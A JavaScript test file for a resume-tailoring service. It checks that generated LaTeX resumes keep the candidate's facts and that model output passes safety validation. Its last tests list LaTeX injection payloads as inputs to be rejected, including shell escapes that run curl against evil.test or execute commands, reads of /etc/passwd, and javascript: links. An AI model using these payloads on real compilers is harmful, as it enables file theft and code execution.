import assert from 'node:assert/strict';
import test from 'node:test';
import { buildSourceFacts, buildPreparationPrompt, buildLatexTailoringPrompt, buildLatexRepairPrompt, buildComparisonPrompt, validateLatexSource, validateResumeFidelity, buildResumeJobSnapshot, resumeJobHash } from '../src/services/resumeLatexContent.js';
import { RESUME_LATEX_PREAMBLE, resumeLatexLinkTarget } from '../src/utils/resumeLatexFormat.js';

const source = { text: `Asha Rao
asha@example.test | +91 98765 43210
EXPERIENCE
Software Engineer | Cedar Systems | Jan 2022 - Present
Built React tools with JavaScript and reduced errors by 20%.
Engineer | Maple Labs | Jun 2020 - Dec 2021
Developed Python services.
EDUCATION
BSc Computer Science | Valley University | 2016 - 2020
SKILLS
React, JavaScript, Python`, links: ['mailto:asha@example.test', 'tel:+919876543210', 'https://example.test/asha'] };
const latex = String.raw`\documentclass[11pt,a4paper]{article}
\usepackage[margin=0.6in]{geometry}
\usepackage{hyperref}
\begin{document}
\textbf{Asha Rao}\\
\href{mailto:asha@example.test}{asha@example.test}
\href{tel:+919876543210}{+91 98765 43210}
\section*{Experience}
Software Engineer | Cedar Systems | Jan 2022 -- Present
\end{document}`;
const fidelity = (text, extra = {}) => validateResumeFidelity({ facts: buildSourceFacts(source), text, links: source.links, tailored: true, ...extra });

test('protected facts retain the candidate identity, each employer, dates, degree and metric', () => {
  const facts = buildSourceFacts(source);
  assert.equal(facts.name, 'Asha Rao');
  assert.deepEqual(facts.emails, ['asha@example.test']);
  assert.ok(JSON.stringify(facts.employment).includes('Cedar Systems'));
  assert.ok(JSON.stringify(facts.employment).includes('Maple Labs'));
  assert.ok(JSON.stringify(facts.education).includes('Valley University'));
  assert.ok(facts.dates.some(date => date.includes('2022')));
  assert.ok(facts.metrics.includes('20%'));
  assert.deepEqual(buildSourceFacts(source), facts);
  assert.equal(fidelity(source.text).valid, true);
});

test('line-wrapped original URLs do not create numeric achievement claims', () => {
  const link = 'https://www.linkedin.com/posts/example%5Fperson_activity-7654321098765432109-ABCD?utm_source=share';
  const original = { ...source, links: [...source.links, link] };
  const facts = buildSourceFacts(original);
  const wrapped = link.replace('7654321098765432109', '7654321098\n765432109');
  const text = `${source.text}\nADDITIONAL INFORMATION\n${wrapped}`;
  assert.deepEqual(validateResumeFidelity({ facts, text, links: original.links }).issues, []);
  const invented = validateResumeFidelity({ facts, text: `${text}\nDelivered 7654321098765432109 projects.`, links: original.links });
  assert.ok(invented.issues.includes('Unsupported number or metric: 7654321098765432109.'),
    'an actual numerical claim remains unsupported even when its digits occur in a source URL');
});

test('wrapped visible source URLs are not protected as candidate metrics', () => {
  const link = 'https://example.test/certificates/7654321098765432109';
  const original = { ...source, text: source.text + '\nADDITIONAL INFORMATION\n' + link.replace('/7654', '/\n7654'), links: [...source.links, link] };
  const facts = buildSourceFacts(original);
  assert.deepEqual(facts.metrics, ['20%']);
  assert.deepEqual(validateResumeFidelity({ facts, text: source.text, links: original.links }).issues, []);
});

test('shared URL prefixes cannot expose resource IDs as candidate numbers in either link order', () => {
  const short = 'https://example.test/';
  const long = short + 'certificates/7654321098765432109';
  for (const links of [[short, long], [long, short]]) {
    for (const visible of [long, long.replace('765432', '765432\n')]) {
      const original = { ...source, text: source.text + '\nADDITIONAL INFORMATION\n' + visible, links: [...source.links, ...links] };
      const facts = buildSourceFacts(original);
      assert.deepEqual(facts.metrics, ['20%']);
      assert.deepEqual(validateResumeFidelity({ facts, text: original.text, links: original.links }).issues, []);
    }
  }
});

test('a skill name in a source URL cannot support a new candidate skill', () => {
  const link = 'https://example.test/certificates/Java/7654321098765432109';
  const original = { ...source, text: source.text + '\nADDITIONAL INFORMATION\n' + link, links: [...source.links, link] };
  const result = validateResumeFidelity({ facts: buildSourceFacts(original), text: source.text + '\nSKILLS\nJava', links: original.links });
  assert.ok(result.issues.includes('Unsupported candidate skill: Java.'));
});

test('an unbulleted documentation achievement cannot become the following employer identity', () => {
  const original = { ...source, text: source.text.replace('Engineer | Maple Labs', 'Updated deployment documentation and reviewed application logs.\nEngineer | Maple Labs') };
  const facts = buildSourceFacts(original);
  assert.deepEqual(facts.employment.map(entry => entry.employer), ['Cedar Systems', 'Maple Labs']);
  const generated = original.text.replace('Updated deployment documentation and reviewed application logs.', 'Maintained deployment documentation and reviewed application logs.');
  assert.equal(validateResumeFidelity({ facts, text: generated, links: source.links }).valid, true);
});

test('additional information is prose rather than a new candidate skill after the skills section', () => {
  const original = { ...source, text: source.text + '\nADDITIONAL INFORMATION\nWrites technical documentation and works with support teams.' };
  const facts = buildSourceFacts(original);
  assert.deepEqual(facts.skills, ['React', 'JavaScript', 'Python']);
  const generated = original.text.replace('Writes technical documentation and works with support teams.', 'Documents technical systems and collaborates with support teams.');
  assert.equal(validateResumeFidelity({ facts, text: generated, links: source.links }).valid, true);
});

test('PDF header rows stay together and wrapped achievements never become employers', () => {
  const original = { text: `Alex Example
alex@example.test
WORK EXPERIENCE
Example Systems   Jul 2024 - Present
Application Developer   Pune, India
• Developed API tests and automated checks for
business workflows, test scenarios, and data integrity.
• Integrated deployment workflows for
acceptance, UI, and performance testing.
Cedar Labs   Jun 2022 - Jun 2024
Software Engineer   Pune, India
• Built reporting services.
EDUCATION
North Valley Vidyapeetham   Aug 2018 - Jun 2022
B. Tech.   Computer Engineering
COURSEWORK/SKILLS
• API Automation,
Acceptance, UI,
Performance
TECHNICAL SKILLS
Python, SQL
ACTIVITIES
Club President
• Mentored student teams.`, links: [] };
  const facts = buildSourceFacts(original);
  assert.deepEqual(facts.employment.map(entry => entry.employer), ['Example Systems', 'Cedar Labs']);
  assert.deepEqual(facts.employment.map(entry => entry.title), ['Application Developer', 'Software Engineer']);
  assert.equal(facts.education.length, 1);
  assert.ok(facts.education[0].anchors.includes('Computer Engineering'));
  assert.ok(!facts.education[0].anchors.some(value => /coursework|acceptance|performance/i.test(value)));
  assert.ok(!facts.skills.some(value => /president|mentored/i.test(value)));
  const rewritten = original.text.replace('business workflows, test scenarios, and data integrity.', 'workflow scenarios and integrity checks.')
    .replace('acceptance, UI, and performance testing.', 'UI, acceptance and performance tests.');
  assert.deepEqual(validateResumeFidelity({ facts, text: rewritten, links: [] }).issues, []);
  const movedDates = rewritten.replace('Jul 2024 - Present', 'TEMP').replace('Jun 2022 - Jun 2024', 'Jul 2024 - Present').replace('TEMP', 'Jun 2022 - Jun 2024');
  assert.equal(validateResumeFidelity({ facts, text: movedDates, links: [] }).valid, false);
});

test('unused annotation-only contacts can be omitted while visible contacts remain protected', () => {
  const original = { ...source, links: [...source.links, 'mailto:legacy-contact@example.test', 'tel:+12025550123'] };
  const facts = buildSourceFacts(original);
  assert.deepEqual(validateResumeFidelity({ facts, text: original.text, links: original.links }).issues, []);
  assert.equal(validateResumeFidelity({ facts, text: original.text, links: source.links }).valid, true, 'unused hidden destinations do not require a Links appendix');
  assert.equal(validateResumeFidelity({ facts, text: original.text, links: [] }).valid, false, 'visible contact destinations remain required');
});

test('missing employers, changed email, missing dates and substituted job titles cannot pass fidelity', () => {
  for (const changed of [source.text.replace('asha@example.test', 'ashar@example.test'), source.text.replace('Cedar Systems', 'Cedar'), source.text.replace('Jan 2022 - Present', ''), source.text.replace('Software Engineer', 'Senior Agentic AI Engineer')]) {
    const result = fidelity(changed);
    assert.equal(result.valid, false, changed);
    assert.ok(result.issues.length > 0);
  }
});

test('added metrics and skills and duplicated education are rejected', () => {
  for (const extra of ['\nDelivered 50 projects.', '\nSkills: React, JavaScript, Python, Kubernetes, AWS', '\nBSc Computer Science | Valley University | 2016 - 2020']) {
    assert.equal(fidelity(source.text + extra).valid, false, extra);
  }
  assert.equal(fidelity(source.text.replace('20%', '200%')).valid, false);
});

test('mailto and tel targets must agree with the original even if the visible contacts are correct', () => {
  assert.equal(fidelity(source.text, { links: ['mailto:wrong@example.test', 'tel:+919876543210', 'https://example.test/asha'] }).valid, false);
  assert.equal(fidelity(source.text, { links: ['mailto:asha@example.test', 'tel:+919876543211', 'https://example.test/asha'] }).valid, false);
  assert.equal(fidelity(source.text, { links: [] }).valid, false);
  assert.equal(fidelity(source.text.replace('asha@example.test', 'Email')).valid, false);
  assert.equal(fidelity(source.text.replace('+91 98765 43210', 'Phone')).valid, false);
});

test('source facts also protect contact information stored only as annotation targets', () => {
  const hidden = { text: source.text.replace('asha@example.test | +91 98765 43210', 'Email | Phone'), links: source.links };
  const result = validateResumeFidelity({ facts: buildSourceFacts(hidden), text: hidden.text, links: ['mailto:other@example.test'], tailored: true });
  assert.equal(result.valid, false);
});

test('fidelity accepts reordered headers, formatting changes and grounded bullet wording', () => {
  const reordered = source.text.replace('Software Engineer | Cedar Systems | Jan 2022 - Present', 'Cedar Systems\nSoftware Engineer\nJanuary 2022 – Present').replace('Built React tools with JavaScript and reduced errors by 20%.', 'Reduced errors by 20% while building JavaScript and React tools.');
  assert.equal(fidelity(reordered).valid, true);
});

test('protected employment dates cannot be reassigned to a different employer', () => {
  const changed = source.text.replace('Jan 2022 - Present', 'TEMP').replace('Jun 2020 - Dec 2021', 'Jan 2022 - Present').replace('TEMP', 'Jun 2020 - Dec 2021');
  assert.equal(fidelity(changed).valid, false);
});

test('tailoring may remove irrelevant project dates while keeping employment and education dates', () => {
  const original = { ...source, text: source.text + '\nPROJECTS\nLegacy experiment | 2015\nBuilt a small prototype.' };
  const facts = buildSourceFacts(original);
  assert.equal(validateResumeFidelity({ facts, text: source.text, links: source.links, tailored: true }).valid, true);
  assert.equal(validateResumeFidelity({ facts, text: source.text, links: source.links, tailored: false }).valid, false);
});

test('a name sharing the header line with a role remains a protected identity', () => {
  const header = { ...source, text: source.text.replace('Asha Rao\n', 'Asha Rao | Software Engineer\n') };
  assert.equal(buildSourceFacts(header).name, 'Asha Rao');
  assert.equal(validateResumeFidelity({ facts: buildSourceFacts(header), text: source.text.replace('Asha Rao', 'Asha Roy'), links: source.links }).valid, false);
});

test('invalid contact encodings fail safely instead of throwing out of validation', () => {
  const result = fidelity(source.text, { links: [...source.links, 'mailto:%zz@example.test'] });
  assert.equal(result.valid, false);
});

test('job snapshots retain full candidate-facing fields and hashes react to every relevant change', () => {
  const job = { title: 'Engineer', company: 'Example', sourceDescription: 'Source '.repeat(2000), description: 'Display description', location: 'Pune', salary: '10-15 LPA', minimumQualification: 'BSc', preferredQualification: 'MSc', experienceRequired: '2 years', requiredSkills: ['Python'], eligibleBatches: [2020], branches: ['CS'], responsibilities: ['Build systems'], applyUrl: 'https://example.test/job', classification: { reason: 'INTERNAL_CLASSIFIER' }, postClassification: { owner: 'INTERNAL_WORKER' }, filterSignals: { confidence: 'INTERNAL_CONFIDENCE' }, clickCount: 42 };
  const snapshot = buildResumeJobSnapshot(job);
  assert.equal(snapshot.sourceDescription, job.sourceDescription);
  assert.deepEqual(snapshot.requiredSkills, ['Python']);
  assert.deepEqual(snapshot.responsibilities, ['Build systems']);
  assert.equal(snapshot.snapshotVersion, 1);
  assert.doesNotMatch(JSON.stringify(snapshot), /INTERNAL_|clickCount|classification|filterSignals/);
  assert.equal(buildResumeJobSnapshot({ source: 'internal-scraper-runner' }).source, undefined);
  for (const field of ['salary', 'location', 'minimumQualification', 'preferredQualification', 'experienceRequired', 'applyUrl']) assert.notEqual(resumeJobHash(job), resumeJobHash({ ...job, [field]: 'changed' }), field);
  assert.equal(resumeJobHash(job), resumeJobHash({ ...job, classification: { reason: 'changed' }, clickCount: 99 }));
});

test('generation and independent comparison prompts ground facts in untrusted source data', () => {
  const facts = buildSourceFacts(source);
  const preparation = buildPreparationPrompt({ source, facts });
  assert.match(preparation, /complete.*LaTeX|LaTeX.*complete/i);
  assert.match(preparation, /untrusted/i);
  assert.match(preparation, /10\s*pt|10.point/i);
  assert.ok(preparation.includes('asha@example.test'));
  const tailored = buildLatexTailoringPrompt({ source, facts, baseLatex: latex, jobSnapshot: { title: 'Senior Agentic AI Engineer', description: 'Docker '.repeat(2000) } });
  assert.ok(tailored.includes('Docker '.repeat(2000)));
  assert.match(tailored, /job requirements.*not.*candidate facts/i);
  assert.match(tailored, /two pages|2 pages/i);
  const comparison = buildComparisonPrompt({ source, latexText: source.text, tailored: true, links: source.links, facts });
  for (const field of ['supported', 'missingFacts', 'unsupportedClaims']) assert.ok(comparison.includes(field));
  assert.match(comparison, /independent|compare/i);
  assert.match(comparison, /Judge factual content, not layout/);
  assert.match(comparison, /original hyperlinks array is not a complete list/);
  const repair = buildLatexRepairPrompt({ originalPrompt: tailored, latex, issues: ['Missing Cedar Systems'] });
  assert.ok(repair.includes('Missing Cedar Systems'));
  assert.match(repair, /complete.*LaTeX|LaTeX.*complete/i);
});

test('LaTeX validation accepts a complete standalone readable document', () => {
  assert.equal(validateLatexSource(latex), latex);
});

test('the constrained compiler format passes the model-output preflight', () => {
  const document = RESUME_LATEX_PREAMBLE + 'Readable candidate document.\n\\end{document}';
  assert.equal(validateLatexSource(document), document);
});

test('inline source destinations preserve escaped dollar and ampersand characters', () => {
  const link = "https://example.test/path?literal=$'&prefix=$`&cash=$$";
  const target = resumeLatexLinkTarget(link);
  assert.equal(target, "https://example.test/path?literal=\\$'\\&prefix=\\$`\\&cash=\\$\\$");
  const output = latex.replace('\\end{document}', () => `\\href{${target}}{Portfolio}\n\\end{document}`);
  assert.equal(validateLatexSource(output), output);
  assert.equal(output.match(/\\documentclass/g).length, 1);
});

test('a single Markdown fence is removed without changing the LaTeX document', () => {
  for (const label of ['latex', 'tex', '']) {
    assert.equal(validateLatexSource(`\n\`\`\`${label}\r\n${latex}\r\n\`\`\`\n`), latex);
  }
});

test('fence handling never extracts a document out of surrounding prose or skips validation', () => {
  for (const value of [
    `Here is your resume:\n\`\`\`latex\n${latex}\n\`\`\``,
    `\`\`\`latex\n${latex}\n\`\`\`\nExplanation`,
    `\`\`\`latex\n${latex}\n\`\`\`\n\`\`\`latex\n${latex}\n\`\`\``,
    `\`\`\`latex\n${latex.replace('\\end{document}', '\\input{/etc/passwd}\\end{document}')}\n\`\`\``,
    `\`\`\`latex\n${latex.replace('11pt', '9pt')}\n\`\`\``,
  ]) assert.throws(() => validateLatexSource(value));
});

test('LaTeX rejection exposes a fixed reason and actionable feedback without candidate text', () => {
  const cases = [
    [null, 'size_or_encoding', /size|encoding/i],
    [latex.replace('\\end{document}', ''), 'document_structure', /documentclass.*end\{document\}/s],
    [latex.replace('11pt', '9pt'), 'font_size', /10pt/],
    [latex.replace('\\begin{document}', '\\input{private-file}\\begin{document}'), 'unsupported_command', /remove/i],
    [latex.replace('\\begin{document}', '\\makeatletter\\begin{document}'), 'tex_escape_hatch', /remove/i],
    [latex.replace('{hyperref}', '{private-package}'), 'unsupported_package', /geometry.*hyperref/],
    [latex.replace('mailto:asha@example.test', 'file:///private-file'), 'unsafe_link', /https?.*mailto.*tel/],
  ];
  for (const [value, reason, feedback] of cases) {
    assert.throws(() => validateLatexSource(value), error => {
      assert.equal(error.code, 'latex_invalid');
      assert.equal(error.reason, reason);
      assert.match(error.message, feedback);
      assert.doesNotMatch(error.message, /asha@|private-file|private-package/);
      return true;
    });
  }
});

test('LaTeX validation rejects external dependencies, TeX escape hatches and dangerous URI targets', () => {
  for (const injected of [String.raw`\input{/etc/passwd}`, String.raw`\includegraphics{https://evil.test/image}`, String.raw`\write18{curl evil.test}`, String.raw`\openout1=/tmp/file`, String.raw`\csname input\endcsname`, String.raw`\directlua{os.execute('id')}`, String.raw`\special{html:<script>}`, String.raw`\catcode0=12`, '^^5cinput{file}', String.raw`\href{javascript:alert(1)}{Portfolio}`, String.raw`\href{file:///etc/passwd}{File}`, String.raw`\usepackage{shellesc}`, String.raw`\makeatletter\@@input /etc/passwd`, String.raw`\ExplSyntaxOn\file_input:n{/etc/passwd}`, String.raw`\endlinechar=92`, String.raw`\addtocontents{/tmp/file}{text}`]) {
    assert.throws(() => validateLatexSource(latex.replace('\\end{document}', `${injected}\n\\end{document}`)), /unsafe|self.contained|unsupported|link|LaTeX/i, injected);
  }
});

test('LaTeX validation enforces complete documents, the size cap and minimum font size', () => {
  for (const invalid of [latex.replace('11pt', '9pt'), latex.replace('\\end{document}', ''), latex.replace('\\begin{document}', '\\begin{document}\\tiny '), latex.replace('\\begin{document}', '\\begin{document}\\fontsize{9}{11}\\selectfont '), latex.replace('\\begin{document}', '\\begin{document}\\fontsize9{11}\\selectfont '), `${latex}${' '.repeat(256 * 1024)}`]) assert.throws(() => validateLatexSource(invalid));
});
